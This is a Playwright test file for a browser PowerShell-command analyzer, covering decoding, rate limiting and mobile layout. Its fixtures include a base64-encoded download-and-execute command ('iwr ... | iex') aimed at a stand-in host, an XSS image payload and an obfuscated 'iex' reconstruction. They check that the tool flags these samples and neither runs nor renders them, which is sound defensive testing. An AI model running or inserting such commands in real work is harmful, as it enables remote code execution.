import { test, expect } from "@playwright/test";
test("decodes without submitting payloads or rendering injected HTML", async ({
  page,
  context,
}) => {
  await page.goto("/");
  await page.waitForLoadState("networkidle");
  const requests = [];
  context.on("request", (r) =>
    requests.push({ url: r.url(), method: r.method(), body: r.postData() }),
  );
  const script =
    "iwr 'https://example.invalid/payload' | iex; '<img src=x onerror=alert(1)>'";
  await page
    .locator("#ps-input")
    .fill(
      "powershell -enc " + Buffer.from(script, "utf16le").toString("base64"),
    );
  await page.getByRole("button", { name: "Analyze command" }).click();
  await expect(page.locator("#ps-status")).toContainText("Analysis complete");
  await expect(page.locator("#ps-summary")).toContainText(
    "download-and-execute",
  );
  await expect(page.locator("#ps-cards img")).toHaveCount(0);
  expect(
    requests.every(
      (r) =>
        r.method === "GET" &&
        !r.body &&
        /^http:\/\/127\.0\.0\.1:5174\/powershell-[a-z]+\.js$/.test(r.url),
    ),
  ).toBe(true);
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download report" }).click();
  expect((await downloadPromise).suggestedFilename()).toBe(
    "powershell-analysis.json",
  );
  await page.getByRole("button", { name: "Clear", exact: true }).click();
  await expect(page.locator("#ps-input")).toHaveValue("");
  await expect(page.locator("#ps-results")).toBeHidden();
});
test("cooldown and hourly browser limits are enforced", async ({ page }) => {
  await page.goto("/");
  await page.getByRole("button", { name: "Load example" }).click();
  await page.getByRole("button", { name: "Analyze command" }).click();
  await expect(page.locator("#ps-status")).toContainText("Analysis complete");
  await page.getByRole("button", { name: "Analyze command" }).click();
  await expect(page.locator("#ps-status")).toContainText("wait 5 seconds");
  await page.evaluate(() =>
    localStorage.setItem(
      "smithey-lab-powershell-attempts-v1",
      JSON.stringify(
        Array.from({ length: 60 }, (_, i) => Date.now() - 10000 - i),
      ),
    ),
  );
  await page.reload();
  await page.getByRole("button", { name: "Load example" }).click();
  await page.getByRole("button", { name: "Analyze command" }).click();
  await expect(page.locator("#ps-status")).toContainText(
    "60 attempts per hour",
  );
});
test("mobile layout and nested reconstruction with reduced motion", async ({
  page,
}) => {
  await page.setViewportSize({ width: 390, height: 844 });
  await page.goto("/");
  await page.locator("#ps-input").fill("& ('xei'[-1..-3]-join '')");
  await page.getByRole("button", { name: "Analyze command" }).click();
  await expect(page.locator("#ps-status")).toContainText("Analysis complete");
  await expect(page.locator("#ps-cards")).toContainText(
    "Recovered invocation targets",
  );
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
  ).toBe(true);
});
